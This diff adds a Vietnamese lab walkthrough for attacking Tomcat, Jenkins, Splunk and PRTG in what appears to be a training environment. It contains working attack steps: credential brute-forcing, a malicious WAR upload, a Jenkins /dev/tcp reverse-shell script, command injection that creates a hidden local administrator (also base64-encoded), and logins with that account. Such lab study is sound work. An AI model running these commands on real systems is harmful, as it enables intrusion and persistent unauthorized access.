@@ -380,3 +380,398 @@ drupal_session => SESS1870755745b9b67ba28e06f87f264552=CSIX0eFiI6rkGucfgtKoo3DYZ
 ```
 
 ![](images/26.png)
+
+# Tomcat - Discovery & Enumeration
+
+#### Questions
+vHosts needed for these questions:
+
+- `app-dev.inlanefreight.local`
+- `web01.inlanefreight.local`
+
++ 0  What version of Tomcat is running on the application located at http://web01.inlanefreight.local:8180?
+
+Truy cập vào `http://web01.inlanefreight.local:8180/docs/`
+
+![](images/27.png)
+
++ 0  What role does the admin user have in the configuration example?
+
+![](images/28.png)
+
+# Attacking Tomcat
+
+#### Questions
+vHosts needed for these questions:
+
+- `web01.inlanefreight.local`
+
++ 0  Perform a login bruteforcing attack against Tomcat manager at http://web01.inlanefreight.local:8180. What is the valid username?
+
+Chọn module brute force:
+
+![](images/29.png)
+
+Tôi sẽ set thêm proxy thông qua `burp` để có thể thử thêm bruteforce với burpsuite
+
+```zsh
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
+rhosts => 10.129.201.58
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set vhost web01.inlanefreight.local
+vhost => web01.inlanefreight.local
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rport 8180
+rport => 8081
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set proxies HTTP:127.0.0.1:8080
+proxies => HTTP:127.0.0.1:8080
+```
+
+```zsh
+[+] 10.129.201.58:8180 - Login Successful: tomcat:root
+```
+
++ 0  What is the password?
+
+BruteForce với Burpsuite Pro:
+
+Như ở trên tôi đã bật sẵn burpsuite và giữ lại request mà msf đã gửi đi.
+
+![](images/31.png)
+
+Gửi nó tới `intruder`. Ở đây theo như mặc định có 2 file username và password. Tuy nhiên tôi không muốn gộp chúng lại thành một và sau đó mã hóa base64 nên tôi chọn option `clusted bomb attack`
+và thêm sẵn 2 biến để fuzz:
+
+![](images/32.png)
+
+Tại payload position 2, chúng ta chọn `tomcat_mgr_default_pass.txt`
+
+![](images/30.png)
+
+Tại payload position 1, chúng ta chọn `tomcat_mgr_default_users.txt`
+
+![](images/33.png)
+
+Tuy nhiên định dạng đúng phải là `username:password`, vậy tôi sẽ thêm rule cho username bằng cách chọn payload postion 1 -> thêm kí tự `:` ở cuối username (add suffix), sau đó mã hóa base64.
+
+![](images/34.png)
+
+![](images/35.png)
+
+Bỏ chọn encoding
+
+![](images/37.png)
+
+Đối với `password` ta chọn `payload position 2` sau đó chỉ việc thêm rule base64 encode. 
+
+![](images/36.png)
+
+Bỏ chọn encoding
+
+![](images/38.png)
+
+Tuy nhiên cách này không thành công vì chúng ta buộc phải encode một chuỗi liền nhau, nếu không kết quả sẽ như này: `dG9tY2F0Og==YWRtaW4=`. Do đó buộc ta phải gộp lại thành một danh sách tách nhau bởi `:` với burpsuite hoặc `python` hoặc `bash`.
+
+Chuyển sang `sniper attack`
+
+![](images/39.png)
+
+Chọn payload type là `custom iterator`, position 1 load file username:
+
+![](images/40.png)
+
+Thêm dấu `:` ngăn cách với password
+
+![](images/41.png)
+
+Tại position 2, load file password:
+
+![](images/42.png)
+
+Cuối cùng, thêm rule encode base64, nhớ bỏ chọn url encode ở cuối
+
+![](images/43.png)
+
+
+Mặc định base64 encode của burp suite sẽ tự thêm kí tự newline, hãy cẩn thận.
+
++ 1  Obtain remote code execution on the http://web01.inlanefreight.local:8180 Tomcat instance. Find and submit the contents of tomcat_flag.txt
+
+Tạo payload
+
+```zsh
+msfvenom -p java/jsp_shell_reverse_tcp lhost=tun0 lport=4444 -f war -o 28afbc9529a8855939ff7d2d8ad9295c.war
+```
+
+Đăng nhập với `tomcat:root`
+
+Tải shell lên tomcat
+
+![](images/44.png)
+
+Cấu hình trên msfconsole
+
+```zsh
+msf6 exploit(multi/handler) > set lhost tun0 
+lhost => tun0
+msf6 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp 
+payload => java/jsp_shell_reverse_tcp
+msf6 exploit(multi/handler) > run
+```
+
+Lấy shell
+
+![](images/45.png)
+# Jenkins - Discovery & Enumeration
+
+#### Questions
+vHosts needed for these questions:
+
+- `jenkins.inlanefreight.local`
+
+ Authenticate to  with user "admin" and password "admin"
+
++ 1  Log in to the Jenkins instance at http://jenkins.inlanefreight.local:8000. Browse around and submit the version number when you are ready to move on.
+
+![](images/46.png)
+
+
+# Attacking Jenkins
+
+#### Questions
+vHosts needed for these questions:
+
+- `jenkins.inlanefreight.local`
+
++ 0  Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory
+
+Chạy đoạn mã sau: trong `http://jenkins.inlanefreight.local:8000/script`
+
+```groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.66/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+
+![](images/47.png)
+
+# Splunk - Discovery & Enumeration
+
+#### Questions
++ 0  Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3).
+
+Quét host với nmap:
+
+```zsh
+PORT     STATE SERVICE       REASON          VERSION
+80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8089/tcp open  ssl/http      syn-ack ttl 127 Splunkd httpd
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+Truy cập vào `https://10.129.201.50:8089/`
+
+![](images/48.png)
+
+# Attacking Splunk
+
+#### Questions
++ 0  Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory.
+
+Chỉnh IP và port trong run.ps1 nếu là windows, rev.py nếu là linux
+
+![](images/49.png)
+
+Chỉnh để tắt rev.py vì host là windows
+
+![](images/50.png)
+
+Nén file lại và tải lên
+
+```zsh
+tar cvzf 28afbc9529a8855939ff7d2d8ad9295c.tar.gz reverse_shell_splunk 
+reverse_shell_splunk/
+reverse_shell_splunk/bin/
+reverse_shell_splunk/bin/run.ps1
+reverse_shell_splunk/bin/run.bat
+reverse_shell_splunk/bin/rev.py
+reverse_shell_splunk/default/
+reverse_shell_splunk/default/inputs.conf
+```
+
+Truy cập `https://10.129.201.50:8000/en-US/app/launcher/home`
+
+Chọn Manage Apps (Góc bên trái) -> Install app from file
+
+![](images/51.png)
+
+Tải file lên và nhận shell
+
+![](images/52.png)
+
+# PRTG Network Monitor
+
+#### Questions
++ 1  What version of PRTG is running on the target?
+
+```zsh
+sudo nmap -sV 10.129.201.50 -vv
+PORT     STATE SERVICE       REASON          VERSION
+80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8000/tcp open  ssl/http      syn-ack ttl 127 Splunkd httpd
+8080/tcp open  http          syn-ack ttl 127 Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
+8089/tcp open  ssl/http      syn-ack ttl 127 Splunkd httpd
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+Như vậy PRTG đang chạy ở port 8080
+
+Truy cập vào trang chủ và view source
+
+![](images/53.png)
+
++ 0  Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop.
+
+Đăng nhập với thông tin `prtgadmin:Password123`
+
+![](images/54.png)
+
+Chọn Setup -> Account Settings -> Notifications -> Add new notification
+
+![](images/55.png)
+
+Đặt tên cho thông báo, cuộn xuống và đánh dấu vào ô bên cạnh `EXECUTE PROGRAM`. Bên dưới `Program File`, chọn `Demo exe notification - outfile.ps1`từ danh sách. Cuối cùng, trong trường tham số, nhập lệnh. Tôi sẽ thêm người dùng quản trị cục bộ mới bằng cách nhập `test.txt;net user SoraTsumi Pwned_by_SoraTsum1! /add;net localgroup administrators SoraTsumi /add`. Trong quá trình đánh giá thực tế, chúng ta có thể muốn thực hiện một thao tác nào đó mà không làm thay đổi hệ thống, chẳng hạn như tạo shell ngược hoặc kết nối với C2. Cuối cùng, nhấp vào `Save`.
+
+```powershell
+test.txt;net user SoraTsumi Pwned_by_SoraTsum1! /add;net localgroup administrators SoraTsumi /add
+```
+
+Hoặc dùng powershell base64
+
+```powershell
+test.txt; powershell -encodedcommand bmV0IHVzZXIgU29yYVRzdW1pIFB3bmVkX2J5X1NvcmFUc3VtMSEgL2FkZDtuZXQgbG9jYWxncm91cCBhZG1pbmlzdHJhdG9ycyBTb3JhVHN1bWkgL2FkZAo=
+```
+
+![](images/63.png)
+
+![](images/56.png)
+
+Sau khi thêm vào nó sẽ ở đây:
+
+![](images/57.png)
+
+
+Để kích hoạt payload, chúng ta phải đặt lịch chạy cho thông báo.
+
+Trước hết phải đồng bộ thời gian với máy chủ:
+
+```zsh
+sudo ntpdate -s 10.129.201.50
+```
+
+Nếu không được ta phải canh thời gian bằng thanh thời gian bên dưới footer:
+
+![](images/59.png)
+
+
+Tiếp theo, tạo một lịch chạy thông báo: Vào Account settings -> Schedules -> Add a new schedule
+
+Đặt tên và thời gian, chọn options  `Use list of period definitions `
+Đặt thời gian theo định dạng `ww:hh:mm-ww:hh:mm` định dạng thời gian là 24h không `am/pm`
+Ví dụ `tu:04:05-tu:04:06`
+
+![](images/60.png)
+
+Sau khi lưu lại nó sẽ xuất hiện ở đây:
+
+![](images/61.png)
+
+Quay lại mục `notifications` chọn vào edit notification mà ta chèn mã độc rồi chọn lịch schedule mà ta vừa thiết lập
+
+![](images/58.png)
+
+Chờ kết quả hoặc nhấn test notification.
+### Khai thác với metasploit
+
+```zsh
+msf6 exploit(windows/http/prtg_authenticated_rce) > set admin_password Password123
+admin_password => Password123
+msf6 exploit(windows/http/prtg_authenticated_rce) > set lhost tun0
+lhost => 10.10.14.66
+msf6 exploit(windows/http/prtg_authenticated_rce) > set lport 1234
+lport => 1234
+msf6 exploit(windows/http/prtg_authenticated_rce) > set rhosts 10.129.201.50
+rhosts => 10.129.201.50
+msf6 exploit(windows/http/prtg_authenticated_rce) > set rport 8080
+rport => 8080
+```
+
+![](images/62.png)
+
+Có thể có một số cách không được, chúng ta sẽ chia làm 2 notifications để tránh bị lỗi câu lệnh
+
+Đầu tiên là thêm user mới
+
+```powershell
+C:\Users\Public\tester.txt;net user SoraTsumi SoraTsum1! /add
+```
+
+![](images/64.png)
+
+Tiếp theo là thêm vào nhóm local admin
+
+```powershell
+C:\Users\Public\tester.txt;net localgroup administrators /add SoraTsumi
+```
+
+![](images/71.png)
+
+Thiết lập schedule cho cả hai.
+
+![](images/67.png)
+
+Lưu ý nếu payload không hoạt động hãy sử dụng tính năng test notification.
+
+Kiểm tra sau khi chạy câu lệnh khi tôi đang có revershell từ msfconsole
+
+```powershell
+net user
+```
+
+![](images/65.png)
+
+```zsh
+nxc rdp 10.129.201.50 -u SoraTsumi -p 'SoraTsum1!' --local-auth
+```
+
+![](images/66.png)
+
+![](images/68.png)
+
+
+Chúng ta hoàn toàn có thể lấy phiên rdp:
+
+```zsh
+xfreerdp3 /v:10.129.201.50 /u:SoraTsumi /p:'SoraTsum1!' /drive:linux,/mnt/share
+```
+
+![](images/70.png)
+
+Hoặc winrm
+
+```zsh
+evil-winrm -i 10.129.201.50 -u SoraTsumi -p 'SoraTsum1!'
+```
+
+![](images/69.png)
